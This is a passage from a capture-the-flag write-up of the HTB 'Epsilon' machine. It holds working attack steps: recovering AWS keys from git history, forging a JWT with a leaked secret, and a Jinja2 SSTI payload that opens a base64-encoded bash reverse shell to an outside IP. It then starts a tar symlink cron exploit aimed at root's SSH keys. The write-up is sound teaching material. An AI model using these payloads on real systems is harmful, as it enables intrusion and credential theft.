        <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'track.html'</span><span class="mtk1">)</span>


<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/order'</span><span class="mtk1">,</span> <span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">,</span> <span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">order</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">verify_jwt</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'auth'</span><span class="mtk1">),</span> <span class="mtk1">secret</span><span class="mtk1">):</span>
        <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span> <span class="mtk5">==</span> <span class="mtk4">'POST'</span><span class="mtk1">:</span>
            <span class="mtk1">costume</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'costume'</span><span class="mtk1">]</span>
            <span class="mtk1">message</span> <span class="mtk5">=</span> <span class="mtk4">'''</span>
            <span class="mtk4">Your</span> <span class="mtk4">order</span> <span class="mtk4">of</span> <span class="mtk4">'</span><span class="mtk6">{}</span><span class="mtk4">'</span> <span class="mtk4">has</span> <span class="mtk4">been</span> <span class="mtk4">placed</span> <span class="mtk4">successfully.</span>
            <span class="mtk4">'''</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">costume</span><span class="mtk1">)</span>
            <span class="mtk1">tmpl</span> <span class="mtk5">=</span> <span class="mtk8">render_template_string</span><span class="mtk1">(</span><span class="mtk1">message</span><span class="mtk1">,</span> <span class="mtk9 mtki">costume</span><span class="mtk5">=</span><span class="mtk1">costume</span><span class="mtk1">)</span>
            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'order.html'</span><span class="mtk1">,</span> <span class="mtk9 mtki">message</span><span class="mtk5">=</span><span class="mtk1">tmpl</span><span class="mtk1">)</span>
        <span class="mtk5">else</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'order.html'</span><span class="mtk1">)</span>
    <span class="mtk5">else</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">,</span> <span class="mtk9 mtki">code</span><span class="mtk5">=</span><span class="mtk6">302</span><span class="mtk1">)</span>


<span class="mtk8 mtku">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">debug</span><span class="mtk5">=</span><span class="mtk4">'true'</span><span class="mtk1">)</span>
</code></pre></div><p>We see it is using some hard-coded credentials (<code>admin:admin</code>). However, they do not work. It seems that we will need to craft a JWT (JSON Web Token) token to access the website, but we do not have the secret key.</p><p>Moreover, we observe that there is a Server-Side Template Injection (SSTI) vulnerability in <code>/order</code>, because we can send <code>costume</code> as a body parameter and it is inserted into a text that will be directly rendered by Jinja2 (the default template engine for Flask), without any validation.</p><p>The file called <code>track_api_CR_148.py</code> contains some stuff for Amazon Web Services (particularly, AWS Lambda):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">io</span>
<span class="mtk5">import</span> <span class="mtk8 mtku">os</span>
<span class="mtk5">from</span> <span class="mtk8 mtku">zipfile</span> <span class="mtk5">import</span> <span class="mtk8 mtku">ZipFile</span>
<span class="mtk5">from</span> <span class="mtk8 mtku">boto3</span>.<span class="mtk8 mtku">session</span> <span class="mtk5">import</span> <span class="mtk8 mtku">Session</span>


<span class="mtk1">session</span> <span class="mtk5">=</span> <span class="mtk8 mtku">Session</span><span class="mtk1">(</span>
    <span class="mtk9 mtki">aws_access_key_id</span><span class="mtk5">=</span><span class="mtk4">'&lt;aws_access_key_id&gt;'</span><span class="mtk1">,</span>
    <span class="mtk9 mtki">aws_secret_access_key</span><span class="mtk5">=</span><span class="mtk4">'&lt;aws_secret_access_key&gt;'</span><span class="mtk1">,</span>
    <span class="mtk9 mtki">region_name</span><span class="mtk5">=</span><span class="mtk4">'us-east-1'</span><span class="mtk1">,</span>
    <span class="mtk9 mtki">endpoint_url</span><span class="mtk5">=</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://cloud.epsilon.htb</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">aws_lambda</span> <span class="mtk5">=</span> <span class="mtk1">session</span><span class="mtk1">.</span><span class="mtk8">client</span><span class="mtk1">(</span><span class="mtk4">'lambda'</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">files_to_zip</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
    <span class="mtk5">for</span> <span class="mtk1">root</span><span class="mtk1">,</span> <span class="mtk1 squiggly-inline-unnecessary">dirs</span><span class="mtk1">,</span> <span class="mtk1">files</span> <span class="mtk5">in</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">walk</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
        <span class="mtk5">for</span> <span class="mtk1">f</span> <span class="mtk5">in</span> <span class="mtk1">files</span><span class="mtk1">:</span>
            <span class="mtk1">full_path</span> <span class="mtk5">=</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">root</span><span class="mtk1">,</span> <span class="mtk1">f</span><span class="mtk1">)</span>
            <span class="mtk1">archive_name</span> <span class="mtk5">=</span> <span class="mtk1">full_path</span><span class="mtk1">[</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">sep</span><span class="mtk1">):]</span>
            <span class="mtk5">yield</span> <span class="mtk1">full_path</span><span class="mtk1">,</span> <span class="mtk1">archive_name</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">make_zip_file_bytes</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
    <span class="mtk1">buf</span> <span class="mtk5">=</span> <span class="mtk8 mtku">io</span><span class="mtk1">.</span><span class="mtk8 mtku">BytesIO</span><span class="mtk1">()</span>
    <span class="mtk5">with</span> <span class="mtk8 mtku">ZipFile</span><span class="mtk1">(</span><span class="mtk1">buf</span><span class="mtk1">,</span> <span class="mtk4">'w'</span><span class="mtk1">)</span> <span class="mtk5">as</span> <span class="mtk1">z</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">full_path</span><span class="mtk1">,</span> <span class="mtk1">archive_name</span> <span class="mtk5">in</span> <span class="mtk8">files_to_zip</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk5">=</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
            <span class="mtk1">z</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">full_path</span><span class="mtk1">,</span> <span class="mtk1">archive_name</span><span class="mtk1">)</span>
    <span class="mtk5">return</span> <span class="mtk1">buf</span><span class="mtk1">.</span><span class="mtk8">getvalue</span><span class="mtk1">()</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">update_lambda</span><span class="mtk1">(</span><span class="mtk9 mtki">lambda_name</span><span class="mtk1">,</span> <span class="mtk9 mtki">lambda_code_path</span><span class="mtk1">):</span>
    <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">isdir</span><span class="mtk1">(</span><span class="mtk9 mtki">lambda_code_path</span><span class="mtk1">):</span>
        <span class="mtk5">raise</span> <span class="mtk8 mtku">ValueError</span><span class="mtk1">(</span><span class="mtk4">'Lambda</span> <span class="mtk4">directory</span> <span class="mtk4">does</span> <span class="mtk4">not</span> <span class="mtk4">exist:</span> <span class="mtk6">{0}</span><span class="mtk4">'</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk9 mtki">lambda_code_path</span><span class="mtk1">))</span>  
    <span class="mtk1">aws_lambda</span><span class="mtk1">.</span><span class="mtk8">update_function_code</span><span class="mtk1">(</span>
        <span class="mtk9 mtki">FunctionName</span><span class="mtk5">=</span><span class="mtk9 mtki">lambda_name</span><span class="mtk1">,</span>
        <span class="mtk9 mtki">ZipFile</span><span class="mtk5">=</span><span class="mtk8">make_zip_file_bytes</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk5">=</span><span class="mtk9 mtki">lambda_code_path</span><span class="mtk1">))</span>
</code></pre></div><p>Again, there are two keys that are not present in the code in order to configure AWS Lambda.</p><p>However, we have the Git repository. Maybe we can find previous commits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
<span class="code-dark-yellow">commit c622771686bd74c16ece91193d29f85b5f9ffa91</span> (<span class="code-cyan">HEAD -&gt;</span> <span class="code-green">master</span>)  
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

<span class="code-dark-yellow">commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

<span class="code-dark-yellow">commit c51441640fd25e9fba42725147595b5918eba0f1</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

<span class="code-dark-yellow">commit 7cf92a7a09e523c1c667d13847c9ba22464412f3</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
</code></pre></div><p>Let&rsquo;s see some differences using the commit identifiers (adding just the beginning of the hash is enough):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> diff b10dd06 c622771
<span class="code-white">diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 545f6fe..8d3b52e 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py</span>
<span class="code-dark-cyan">@@ -8,8 +8,8 @@</span> session = Session(
     aws_access_key_id='&lt;aws_access_key_id&gt;',
     aws_secret_access_key='&lt;aws_secret_access_key&gt;',  
     region_name='us-east-1',
<span class="code-dark-red">-    endpoint_url='http://cloud.epsilong.htb')
-aws_lambda = session.client('lambda')</span>
<span class="code-dark-green">+    endpoint_url='http://cloud.epsilon.htb')
+aws_lambda = session.client('lambda')</span>
</code></pre></div><p>Ok, this is just a typo, although we can put <code>cloud.epsilon.htb</code> into <code>/etc/hosts</code>. Here is a more interesting difference:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> diff 7cf92a c514416
<span class="code-white">diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index fed7ab9..545f6fe 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py</span>
<span class="code-dark-cyan">@@ -5,8 +5,8 @@</span> from boto3.session import Session


 session = Session(
<span class="code-dark-red">-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',</span>  
<span class="code-dark-green">+    aws_access_key_id='&lt;aws_access_key_id&gt;',
+    aws_secret_access_key='&lt;aws_secret_access_key&gt;',</span>
     region_name='us-east-1',
     endpoint_url='http://cloud.epsilong.htb')
 aws_lambda = session.client('lambda')
</code></pre></div><p>And here we have some hard-coded secrets to setup AWS Lambda. Using this, we can configure AWS CLI to interact with AWS Lambda and download the code for the function:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A  
Default region name [None]: us-east-1
Default output format [None]:
</code></pre></div><p>Then, we can list the functions that are deployed for <code>cloud.epsilon.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://cloud.epsilon.htb lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",  
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-02-14T23:01:58.240+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d54a4387-53bc-49c5-a55c-c3bc5c8aed47",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
</code></pre></div><p>We see that <code>costume_shop_v1</code> is the only function. Let&rsquo;s examine it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name costume_shop_v1  
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-02-11T05:29:01.295+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "bf23b664-e576-4493-8578-9906b999b8cc",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
</code></pre></div><p>The code is availbable at a given URL, in a ZIP file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> code
code: Zip archive data, at least v2.0 to extract, compression method=deflate  

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> code
Archive:  code
  inflating: lambda_function.py
</code></pre></div><p>This is the source code for the deployed AWS Lambda function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">json</span>

<span class="mtk1">secret</span> <span class="mtk5">=</span> <span class="mtk4">'RrXCv`mrNe!K!4+5`wYq'</span>  <span class="mtk3">#</span> <span class="mtk3">apigateway</span> <span class="mtk3">authorization</span> <span class="mtk3">for</span> <span class="mtk3">CR-124</span>

<span class="mtk4">'''Beta</span> <span class="mtk4">release</span> <span class="mtk4">for</span> <span class="mtk4">tracking'''</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">lambda_handler</span><span class="mtk1">(</span><span class="mtk9 mtki">event</span><span class="mtk1">,</span> <span class="mtk9 mtki squiggly-inline-unnecessary">context</span><span class="mtk1">):</span>
    <span class="mtk5">try</span><span class="mtk1">:</span>
        <span class="mtk1">id</span> <span class="mtk5">=</span> <span class="mtk9 mtki">event</span><span class="mtk1">[</span><span class="mtk4">'queryStringParameters'</span><span class="mtk1">][</span><span class="mtk4">'order_id'</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk1">id</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">{</span>
                <span class="mtk4">'statusCode'</span><span class="mtk1">:</span> <span class="mtk6">200</span><span class="mtk1">,</span>
                <span class="mtk4">'body'</span><span class="mtk1">:</span> <span class="mtk8 mtku">json</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk8 mtku">str</span><span class="mtk1">(resp))</span>  <span class="mtk3">#</span> <span class="mtk3">dynamodb</span> <span class="mtk3">tracking</span> <span class="mtk3">for</span> <span class="mtk3">CR-342</span>  
            <span class="mtk1">}</span>
        <span class="mtk5">else</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">{</span>
                <span class="mtk4">'statusCode'</span><span class="mtk1">:</span> <span class="mtk6">500</span><span class="mtk1">,</span>
                <span class="mtk4">'body'</span><span class="mtk1">:</span> <span class="mtk8 mtku">json</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk4">'Invalid</span> <span class="mtk4">Order</span> <span class="mtk4">ID'</span><span class="mtk1">)</span>
            <span class="mtk1">}</span>
    <span class="mtk5">except</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk1">{</span>
            <span class="mtk4">'statusCode'</span><span class="mtk1">:</span> <span class="mtk6">500</span><span class="mtk1">,</span>
            <span class="mtk4">'body'</span><span class="mtk1">:</span> <span class="mtk8 mtku">json</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk4">'Invalid</span> <span class="mtk4">Order</span> <span class="mtk4">ID'</span><span class="mtk1">)</span>
        <span class="mtk1">}</span>
</code></pre></div><p>And here we have the secret for the JWT implementation.</p><h2 id="foothold-on-the-machine">Foothold on the machine</h2><p>Now we are able to craft a valid JWT token as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; import jwt
&gt;&gt;&gt; jwt.encode({'username': 'admin'}, 'RrXCv`mrNe!K!4+5`wYq', algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'  
</code></pre></div><p>We can use this token as a cookie named <code>auth</code> to access to some more pages in the website:</p><p><img alt="Epsilon home" src="/images/HTB/Epsilon/Epsilon-home.webp"></p><p><img alt="Epsilon order" src="/images/HTB/Epsilon/Epsilon-order.webp"></p><p>However, we found an SSTI attack vector in <code>/order</code>, so let&rsquo;s exploit it.</p><p>First of all, we must test that the SSTI works using a simple payload:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.134:5000/order -sd <span class="code-dark-yellow">'costume={{7*7}}&q=1337&addr=asdf'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'</span> | <span class="code-dark-green">grep</span> 49  
                        Your order of "<span class="code-red">49</span>" has been placed successfully.
</code></pre></div><p>Since <code>{{7*7}}</code> is replaced by <code>49</code>, the injection works. Now we can check <a target="_blank" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">PayloadsAllTheThings</a> to take a Remote Code Execution (RCE) payload like this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">{{ cycler.__init__.__globals__.os.popen('id').read() }}  
</code></pre></div><p>But instead of using <code>id</code> as a command, we will execute a reverse shell encoding the command in Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>Now we send the payload while we listen with <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.134:5000/order -sd <span class="code-dark-yellow">'costume={{cycler.__init__.__globals__.os.popen("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash").read()}}&q=1337&addr=asdf'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.134.
Ncat: Connection from 10.10.11.134:32940.
bash: cannot set terminal process group (996): Inappropriate ioctl for device  
bash: no job control in this shell
tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tom@epsilon:/var/www/app$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
tom@epsilon:/var/www/app$ export TERM=xterm
tom@epsilon:/var/www/app$ export SHELL=bash
tom@epsilon:/var/www/app$ stty rows 50 columns 158
tom@epsilon:/var/www/app$ cd
tom@epsilon:~$ cat user.txt
f331291fab610895dd18aefba73ffb2c
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Basic enumeration tells us that there weird directory at <code>/opt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tom@epsilon:~$ ls -la --time-style=+ /opt  
total 16
drwxr-xr-x  4 root root 4096  <span class="code-blue">.</span>
drwxr-xr-x 19 root root 4096  <span class="code-blue">..</span>
drwxr-xrwx  2 root root 4096  <span class="code-blue code-bg-green">backups</span>
drwx--x--x  4 root root 4096  <span class="code-blue">containerd</span>
</code></pre></div><p>We are able to write and read from this <code>backups</code> directory. Usually, backups are made periodically, so maybe we can find a script that is being run as a Cron job:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tom@epsilon:~$ find / -type f -name \*backup\* 2&gt;/dev/null | grep -v python
/usr/share/man/man8/vgcfgbackup.8.gz
/usr/src/linux-headers-5.4.0-97-generic/include/config/wm831x/backup.h
/usr/src/linux-headers-5.4.0-97-generic/include/config/net/team/mode/activebackup.h
/usr/src/linux-headers-5.4.0-97/tools/testing/selftests/net/tcp_fastopen_backup_key.sh  
/usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
/usr/lib/modules/5.4.0-97-generic/kernel/drivers/power/supply/wm831x_backup.ko
/usr/lib/modules/5.4.0-97-generic/kernel/drivers/net/team/team_mode_activebackup.ko
/usr/bin/backup.sh
/sys/devices/virtual/net/veth3701941/brport/backup_port
</code></pre></div><p>There is a Bash script at <code>/usr/bin/backup.sh</code> that performs a periodic backup of <code>/var/www/app</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk1">file=</span><span class="mtk4">`date</span> <span class="mtk4">+%N`</span>
<span class="mtk1">/usr/bin/rm</span> <span class="mtk1">-rf</span> <span class="mtk1">/opt/backups/</span><span class="mtk5">*</span>
<span class="mtk1">/usr/bin/tar</span> <span class="mtk1">-cvf</span> <span class="mtk4">"/opt/backups/</span><span class="mtk1">$file</span><span class="mtk4">.tar"</span> <span class="mtk1">/var/www/app/</span>
<span class="mtk1">sha1sum</span> <span class="mtk4">"/opt/backups/</span><span class="mtk1">$file</span><span class="mtk4">.tar"</span> <span class="mtk5">|</span> <span class="mtk1">cut</span> <span class="mtk1">-d</span> <span class="mtk4">'</span> <span class="mtk4">'</span> <span class="mtk1">-f1</span> <span class="mtk5">&gt;</span> <span class="mtk1">/opt/backups/checksum</span>
<span class="mtk1">sleep</span> <span class="mtk1">5</span>
<span class="mtk1">check_file=</span><span class="mtk4">`date</span> <span class="mtk4">+%N`</span>
<span class="mtk1">/usr/bin/tar</span> <span class="mtk1">-chvf</span> <span class="mtk4">"/var/backups/web_backups/</span><span class="mtk1">${check_file}</span><span class="mtk4">.tar"</span> <span class="mtk1">/opt/backups/checksum</span> <span class="mtk4">"/opt/backups/</span><span class="mtk1">$file</span><span class="mtk4">.tar"</span>  
<span class="mtk1">/usr/bin/rm</span> <span class="mtk1">-rf</span> <span class="mtk1">/opt/backups/</span><span class="mtk5">*</span>
</code></pre></div><p>The vulnerability here is the use of <code>-h</code> for <code>tar</code> because it will follow symlinks and compress their contents. Using <a target="_blank" href="https://github.com/7Rocky/explainsh"><code>explainsh</code></a>, we can see what each flag of the command does:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">explainsh</span> <span class="code-dark-yellow">'tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"'</span>  

The GNU version of the tar archiving utility

<span class="code-dark-red">-c</span>, <span class="code-dark-red">--create</span>
      create a new archive

<span class="code-dark-red">-h</span>, <span class="code-dark-red">--dereference</span>
      follow symlinks; archive and dump the files they point to

<span class="code-dark-red">-v</span>, <span class="code-dark-red">--verbose</span>
      verbosely list files processed

<span class="code-dark-red">-f</span>, <span class="code-dark-red">--file</span> <span class="code-dark-cyan">ARCHIVE</span>
      use archive file or device ARCHIVE

<span class="code-dark-red">tar</span> [<span class="code-dark-red">-</span>] <span class="code-dark-red">A --catenate --concatenate | c --create | d --diff --compare | --delete | r --append | t --list |
    --test-label | u --update | x --extract --get</span> [<span class="code-dark-cyan">options</span>] [<span class="code-dark-cyan">pathname ...</span>]

<span class="code-dark-green">http://manpages.ubuntu.com/manpages/precise/en/man1/tar.html</span>
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>In order to exploit the Cron job, we will use <code>/opt/backups/checksum</code> to store a symlink to <code>/root/.ssh</code>. This must be configured after the first execution of <code>tar</code> (we will have 5 seconds). The second one uses <code>-h</code>, so the contents of <code>/opt/backups/checksum -> /root/.ssh</code> will be compressed and stored at <code>/var/backups/web_backups/</code>.</p><p>Although it can be done manually, I decided to use a custom Bash script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tom@epsilon:~$ cd /tmp
tom@epsilon:/tmp$ vim privesc.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">bash</span>

<span class="mtk5">while</span> <span class="mtk7">true</span><span class="mtk5">;</span> <span class="mtk5">do</span>
